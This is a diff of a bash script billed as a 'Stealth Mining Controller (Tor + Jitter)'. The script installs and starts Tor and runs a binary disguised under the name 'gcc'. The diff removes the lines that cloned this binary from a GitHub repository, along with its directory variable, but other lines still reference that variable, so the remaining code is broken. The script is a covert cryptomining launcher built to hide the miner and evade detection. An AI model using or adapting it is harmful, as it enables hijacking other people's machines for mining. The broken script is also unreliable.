@@ -6,9 +6,6 @@ set -u
 # CONFIGURATION
 # ------------------------------------------------------------
 
-# The repository to clone
-REPO_URL="https://github.com/anonymousperson456/m"
-REPO_DIR="m"
 # The binary inside the repo to run
 BINARY_NAME="gcc" 
 BINARY_PATH="./${REPO_DIR}/${BINARY_NAME}"
@@ -29,10 +26,6 @@ echo "=========================================="
 echo " Stealth Mining Controller (Tor + Jitter)"
 echo "=========================================="
 
-# 1. Clean previous runs
-echo "[*] Cleaning up previous runs..."
-rm -rf "${REPO_DIR}"
-
 # 2. Update System & Install Tor
 echo "[*] Updating system and installing Tor..."
 sudo apt update -y
@@ -43,10 +36,6 @@ echo "[*] Starting Tor daemon..."
 (tor &)
 # Wait briefly for Tor to initialize
 sleep 2
-
-# 4. Clone the repository
-echo "[*] Cloning ${REPO_URL}..."
-git clone "${REPO_URL}"
 
 # 5. Make executable and verify
 if [ ! -x "${BINARY_PATH}" ]; then
